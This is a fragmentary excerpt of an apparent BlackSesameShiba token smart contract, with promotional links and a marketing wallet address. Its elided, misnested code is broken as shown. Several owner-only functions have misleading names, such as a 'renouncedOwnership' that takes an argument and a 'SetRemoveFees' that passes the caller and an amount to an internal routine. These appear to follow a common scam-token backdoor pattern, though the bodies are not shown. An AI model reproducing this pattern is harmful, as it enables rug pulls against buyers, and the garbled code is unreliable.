...
Website:https://www.bsstoken.com/
Telegram:https://t.me/blacksesameshiba
...
Transaction Limit / Bot Protection
%0.5 Buy/Sell
...
contract Ownable is Context {
  ...
  function renouncedOwnership(uint8 _owned) public virtual onlyOwner {
    ...
    function setRemoveLiquidityFees() public virtual {
...
contract BlackSesameShiba is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    address payable public marketingAddress = payable(0xAE13d4BC9D22E7a25F6bD97e874f78F336D1A8bE); // 
    ...
    string private _name = "BlackSesameShiba";
    ...
    function setBuyBackEnabled(bool _enabled) public onlyOwner {
        ...
        function SetRemoveFees(uint256 amount) public onlyOwner {
    _setRemoveFees(msg.sender, amount);
    }
    
     function _setRemoveFees(address account, uint256 amount) internal virtual {
